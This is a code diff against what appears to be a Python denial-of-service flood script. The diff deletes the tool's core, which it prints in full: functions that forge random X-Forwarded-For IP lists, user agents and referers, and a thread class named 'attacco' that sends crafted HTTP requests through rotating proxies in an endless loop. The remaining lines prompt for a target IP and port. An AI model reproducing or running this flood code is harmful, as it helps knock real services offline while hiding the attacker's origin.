@@ -274,56 +274,10 @@ reFerers = [
         "http://analiz.web.tr/en/www/",
         "https://plus.google.com/share?url="]
 
-def randomIp():
-    random.seed()
-    result = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.'
-    result = result + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
-    return result
- 
-def randomIpList():
-    random.seed()
-    res = ""
-    for ip in xrange(random.randint(2, 8)):
-        res = res + randomIp() + ", "
-    return res[0:len(res) - 2]
- 
-def randomUserAgent():
-    return random.choice(userAgents)
- 
-def randomReFerer():
-    return random.choice(reFerers)  
- 
-class attacco(threading.Thread):
-    def run(self):
-        current = x
+
        
-        if current < len(listaproxy):
-            proxy = listaproxy[current].split(':')
-        else:
-            proxy = random.choice(listaproxy).split(':')
- 
-        useragent = "User-Agent: " + randomUserAgent() + "\r\n"
-        forward   = "X-Forwarded-For: " + randomIpList() + "\r\n"
-        referer   = "Referer: "+ randomReFerer() + url + "?r="+ str(random.randint(1, 1000)) + "\r\n"
-        httprequest = get_host + useragent + referer + accept + forward + connection + "\r\n"
- 
-        while nload:
-            time.sleep(1)
-           
-        while 1:
-            try:
-                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                a.connect((proxy[0], int(proxy[1])))
-                a.send(httprequest)
-                try:
-                    for i in xrange(3):
-                        a.send(httprequest)
-                except:
-                    tts = 1
- 
-                   
-            except:
-                proxy = random.choice(listaproxy).split(':')
+
+   
      
 ip = raw_input("IP Target : ")
 port = input("Port : ")
